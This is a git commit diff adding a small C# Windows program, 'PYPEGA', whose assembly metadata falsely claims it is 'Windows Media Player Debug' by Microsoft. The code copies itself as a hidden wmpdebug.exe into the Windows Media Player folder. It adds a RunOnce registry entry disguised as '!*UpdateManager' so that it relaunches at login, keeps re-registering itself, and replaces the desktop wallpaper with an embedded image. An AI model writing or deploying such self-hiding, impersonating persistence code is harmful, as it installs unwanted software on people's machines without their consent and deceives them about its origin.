c7d6d9979e888bc0c25d5eb5dea68d5e1b40272a
livingflore <sergey.tombstone@gmail.com>
2022-03-08 23:08:02 +0500

    fc

---
+++ PYPEGA/Properties/AssemblyInfo.cs
@@ -0,0 +1,36 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// Общие сведения об этой сборке предоставляются следующим набором
+// набора атрибутов. Измените значения этих атрибутов для изменения сведений,
+// связанные с этой сборкой.
+[assembly: AssemblyTitle("Windows Media Player Debug")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("Microsoft")]
+[assembly: AssemblyProduct("Windows Media Player Debug by Microsoft")]
+[assembly: AssemblyCopyright("Copyright ©  2014")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Установка значения False для параметра ComVisible делает типы в этой сборке невидимыми
+// для компонентов COM. Если необходимо обратиться к типу в этой сборке через
+// из модели COM задайте для атрибута ComVisible этого типа значение true.
+[assembly: ComVisible(false)]
+
+// Следующий GUID представляет идентификатор typelib, если этот проект доступен из модели COM
+[assembly: Guid("7d03529d-f669-484f-8e19-0bbc21660440")]
+
+// Сведения о версии сборки состоят из указанных ниже четырех значений:
+//
+//      Основной номер версии
+//      Дополнительный номер версии
+//      Номер сборки
+//      Номер редакции
+//
+// Можно задать все значения или принять номера сборки и редакции по умолчанию 
+// используя "*", как показано ниже:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("5.7.0.4")]
+[assembly: AssemblyFileVersion("6.2.2.7")]
---
+++ PYPEGA/Pypega.cs
@@ -0,0 +1,76 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace PYPEGA
+{
+    class Pypega
+    {
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int SystemParametersInfo(
+                        int uAction, int uParam,
+                        string lpvParam, int fuWinIni);
+        public const int SPI_SETDESKWALLPAPER = 20;
+        const int SPIF_UPDATEINIFILE = 0x01;
+        const int SPIF_SENDWININICHANGE = 0x02;
+
+
+        static void GetPeped()
+        {
+            RegistryKey cu = Registry.CurrentUser;
+            RegistryKey reg = cu.OpenSubKey(@"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
+            reg.SetValue("!*UpdateManager", Application.ExecutablePath.Replace('/', '\\') + " /d");
+        }
+
+        static void SaveTemp(string path)
+        {
+            //Console.WriteLine('b');
+            Bitmap pepe = new Bitmap(Properties.Resources.pepe);
+            pepe.Save(path, ImageFormat.Bmp);
+            Thread.Sleep(2500);
+        }
+
+        static void Main(string[] args)
+        {
+            if (args.Length != 0)
+            {
+                //Console.WriteLine('a');
+                //File.Create("D:/PEPEGANG");
+                GetPeped();
+                var path = "C:/temp.bmp";
+                SaveTemp(path);
+                Console.WriteLine(SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE));
+                File.Delete(path);
+                
+            }
+            else
+            {
+                if (File.Exists(@"C:\Program Files\Windows Media Player\wmpdebug.exe"))
+                {
+                    File.Delete(@"C:\Program Files\Windows Media Player\wmpdebug.exe");
+                }
+                File.Copy(Application.ExecutablePath.Replace('/', '\\'), @"C:\Program Files\Windows Media Player\wmpdebug.exe");
+                File.SetAttributes(@"C:\Program Files\Windows Media Player\wmpdebug.exe", File.GetAttributes(@"C:\Program Files\Windows Media Player\wmpdebug.exe") | FileAttributes.Hidden);
+                Process pypega = new Process();
+                //pypega.StartInfo.FileName = @"C:\Program Files\Windows Media Player\wmpdebug.exe";
+                //pypega.StartInfo.Arguments = " /d";
+                //pypega.Start();
+                RegistryKey cu = Registry.CurrentUser;
+                RegistryKey reg = cu.OpenSubKey(@"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
+                reg.SetValue("!*UpdateManager", @"C:\Program Files\Windows Media Player\wmpdebug.exe /d");
+            }
+            
+        }
+    }
+}
